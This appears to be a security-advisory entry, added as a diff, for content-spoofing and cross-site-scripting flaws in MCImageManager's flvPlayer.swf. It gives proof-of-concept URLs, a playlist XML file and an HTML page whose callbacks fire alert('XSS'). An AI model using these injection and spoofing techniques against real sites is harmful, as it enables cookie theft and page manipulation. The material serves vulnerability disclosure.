@@ -1,0 +1,47 @@
+source: http://www.securityfocus.com/bid/61825/info
+
+MCImageManager is prone to multiple security vulnerabilities.
+
+An attacker may exploit these issues to execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, manipulate the page and spoof content to misguide users and to disclose or modify sensitive information. Other attacks may also be possible.
+
+MCImageManager 3.1.5 and prior versions are vulnerable. 
+
+
+http://www.example.com/tiny_mce/plugins/imagemanager/pages/im/flvplayer/flvPlayer.swf?flvToPlay=1.flv
+
+http://www.example.com/tiny_mce/plugins/imagemanager/pages/im/flvplayer/flvPlayer.swf?autoStart=false&startImage=1.jpg
+
+http://www.example.com/tiny_mce/plugins/imagemanager/pages/im/flvplayer/flvPlayer.swf?flvToPlay=1.flv&autoStart=false&startImage=1.jpg
+
+http://www.example.com/tiny_mce/plugins/imagemanager/pages/im/flvplayer/flvPlayer.swf?flvToPlay=1.xml
+
+File 1.xml:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<playlist>
+<item name="Content Spoofing" thumbnail="1.jpg" url="1.flv"/>
+<item name="Content Spoofing" thumbnail="2.jpg" url="2.flv"/>
+</playlist>
+
+
+<html>
+<body>
+<script>
+function flvStart() {
+alert('XSS');
+}
+function flvEnd() {
+alert('XSS');
+}
+</script>
+<object width="50%" height="50%">
+<param name=movie value="flvPlayer.swf">
+<param name=quality value=high>
+
+<embed src="flvPlayer.swf?flvToPlay=1.flv&jsCallback=true" width="50%" height="50%" quality=high pluginspage="http://www.example1.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash"; type="application/x-shockwave-flash"></embed>
+
+</object>
+</body>
+</html>
+
+
